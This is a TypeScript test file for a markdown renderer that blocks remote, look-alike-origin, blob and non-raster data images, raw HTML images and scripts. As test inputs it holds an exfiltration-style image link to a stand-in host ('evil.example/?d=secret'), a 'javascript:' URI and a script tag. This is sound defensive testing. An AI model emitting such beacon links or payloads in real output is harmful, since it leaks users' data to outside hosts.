import { expect, test } from 'bun:test'
import { JSDOM } from 'jsdom'

import { renderMarkdownHTML, type MarkdownRenderEnvironment } from './markdown-render'

function environment(origin = 'https://leapview.test'): MarkdownRenderEnvironment {
  const dom = new JSDOM('<!doctype html><body></body>', { url: `${origin}/` })
  return { window: dom.window as unknown as Window & typeof globalThis }
}

function render(markdown: string, env = environment()): Document {
  const dom = new JSDOM(`<body>${renderMarkdownHTML(markdown, env)}</body>`)
  return dom.window.document
}

test('remote markdown images are never emitted as image elements', () => {
  const doc = render('![x](https://evil.example/?d=secret)')
  expect(doc.querySelector('img')).toBeNull()
  expect(doc.body.innerHTML).not.toContain('<img')
})

test('blocked images remain visible as a link carrying the alt text', () => {
  const doc = render('![chart of revenue](https://evil.example/pixel.png)')
  const link = doc.querySelector('a')!
  expect(link.textContent).toBe('Image: chart of revenue')
  expect(link.getAttribute('href')).toBe('https://evil.example/pixel.png')
  expect(link.getAttribute('rel')).toContain('noreferrer')
})

test('blocked images without alt text fall back to a generic label', () => {
  const doc = render('![](https://evil.example/pixel.png)')
  expect(doc.querySelector('a')!.textContent).toBe('Image')
})

test('protocol-relative and look-alike origins are treated as remote', () => {
  for (const src of ['//evil.example/x.png', 'https://leapview.test.evil.example/x.png', 'http://leapview.test/x.png', 'https://leapview.test:8443/x.png']) {
    expect(render(`![x](${src})`).querySelector('img')).toBeNull()
  }
})

test('same-origin and data raster images are kept', () => {
  const env = environment()
  const dataURL = 'data:image/png;base64,iVBORw0KGgo='
  for (const src of ['/static/chart.png', 'https://leapview.test/files/chart.png', dataURL]) {
    const img = render(`![ok](${src})`, env).querySelector('img')
    expect(img?.getAttribute('src')).toBe(src)
    expect(img?.getAttribute('referrerpolicy')).toBe('no-referrer')
    expect(img?.getAttribute('loading')).toBe('lazy')
  }
})

test('blob images are blocked because markdown never legitimately references them', () => {
  expect(render('![x](blob:https://leapview.test/6e1c1c8e-0000-4000-8000-000000000000)').querySelector('img')).toBeNull()
})

test('data images other than rasters are blocked', () => {
  for (const src of ['data:image/svg+xml;base64,PHN2Zy8+', 'data:text/html;base64,PGI+', 'javascript:alert(1)']) {
    expect(render(`![x](${src})`).querySelector('img')).toBeNull()
  }
})

test('raw HTML images and responsive sources are not rendered', () => {
  const doc = render('<img src="https://evil.example/a.png" srcset="https://evil.example/b.png 2x"><picture><source srcset="https://evil.example/c.png"></picture>')
  expect(doc.querySelector('img, picture, source')).toBeNull()
})

test('ordinary markdown still renders and sanitizes scripts', () => {
  const doc = render('# Title\n\n**bold** [link](https://example.com)\n\n<script>window.x=1</script>')
  expect(doc.querySelector('h1')?.textContent).toBe('Title')
  expect(doc.querySelector('strong')?.textContent).toBe('bold')
  expect(doc.querySelector('a')?.getAttribute('href')).toBe('https://example.com')
  expect(doc.querySelector('script')).toBeNull()
})
